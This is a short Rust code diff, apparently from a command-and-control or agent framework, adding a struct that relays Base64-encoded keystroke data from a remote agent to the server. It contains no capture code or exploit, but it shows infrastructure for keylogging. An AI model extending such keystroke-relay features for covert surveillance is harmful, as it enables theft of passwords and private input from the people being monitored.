@@ -45,3 +45,11 @@ pub struct AgentStreamClosedPayload {
     pub agent_id: String,
     pub stream_id: StreamId,
 }
+
+/// Payload emitted when the server relays keylogger data from an agent.
+#[derive(Debug, Clone, Serialize)]
+pub struct AgentKeyloggerPayload {
+    pub agent_id: String,
+    /// Base64-encoded keystroke data from the agent.
+    pub data: String,
+}
